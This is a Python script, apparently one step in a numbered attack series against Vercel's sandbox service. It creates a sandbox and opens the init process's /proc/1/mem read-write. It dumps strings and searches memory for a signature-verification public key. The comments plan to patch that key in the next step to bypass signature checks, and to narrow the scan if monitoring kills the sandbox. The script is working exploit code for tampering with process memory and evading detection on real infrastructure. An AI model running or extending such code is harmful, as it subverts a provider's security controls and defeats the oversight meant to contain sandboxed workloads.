# 实验J198: A)dump rodata头名字符串(0x9ef056/0x9ef061) B)全内存搜公钥32字节 C)搜base64源串
# j197: x-signature/x-timestamp也错 -> 停止猜头名, 直接读字符串
# 本步: 纯侦察(不patch不请求) -> 定位公钥存储 -> 下步数据patch换公钥(绕开I-cache)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=26000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj198"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE = r'''
import os, time
out = open("/tmp/d198.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")

fd = os.open("/proc/1/mem", os.O_RDWR)

def read_at(addr, n):
    os.lseek(fd, addr, 0)
    return os.read(fd, n)

def dump(addr, n, tag):
    b = read_at(addr, n)
    p(tag, hex(addr), b.hex())
    # 可打印部分
    s = "".join(chr(c) if 32 <= c < 127 else "." for c in b)
    p(tag, "ascii:", repr(s))

# PA: rodata 字符串区 0x9ef040-0x9ef090 (wrapunary两个Header.Get key)
p("CP", "PA")
dump(0x9ef040, 0x60, "STR1")
# 0x5f60c1 附近的中间件错误消息也dump出来
dump(0x9f60a0, 0x60, "ERR")

# PB: 公钥32字节全内存搜索
p("CP", "PB")
PK = bytes.fromhex("59537c81c920570284aee2ea2929144e5d1e37260343391e521feb19e68e2541")
B64 = b"WVN8gckgVwKEruLqKSkUTl0eNyYDQzkeUh/rGeaOJUE"
def scan(start, size, pat, tag, maxhits=20):
    hits = []
    CH = 65536
    off = start
    end = start + size
    while off < end:
        os.lseek(fd, off, 0)
        b = os.read(fd, min(CH, end - off))
        if not b:
            break
        i = b.find(pat)
        while i >= 0 and len(hits) < maxhits:
            hits.append(hex(off + i))
            i = b.find(pat, i + 1)
        off += len(b)
    p("HITS", tag, len(hits), hits)
    return hits

# 1) rodata 0x8db000 - 0xe30000 (5.5MB)
scan(0x8db000, 0xe30000 - 0x8db000, PK, "PK_RODATA")
scan(0x8db000, 0xe30000 - 0x8db000, B64, "B64_RODATA")
# 2) data+bss 0xe30000 - 0x2ee2000 (34MB, 重扫含bss)
scan(0xe30000, 0x2ee2000 - 0xe30000, PK, "PK_DATA")
scan(0xe30000, 0x2ee2000 - 0xe30000, B64, "B64_DATA")
# 3) arena 0x287d30400000 - 0x287d30c00000 (64MB)
scan(0x287d30400000, 0x8000000, PK, "PK_ARENA")
scan(0x287d30400000, 0x8000000, B64, "B64_ARENA")

p("CP", "PC")
# 小技巧: 把搜索到的PK区域(0x9ef056前后)再次打印 以及 verify字符串"missing signature header"
for a in (0x9ef040, 0x9f60c1 - 0x20, 0x9ef061):
    dump(a, 0x30, "CTX%d" % a)
p("done")
out.close()
os.close(fd)
'''

st = run_cmd(sid, CODE, "J198", timeout=290)
time.sleep(2)
bashfile(sid, "cat /tmp/d198.txt", "marker", 20000)
if st == "DEAD":
    print("\n!!! DEATH -> 侦察触发监控, next: 缩小范围", flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
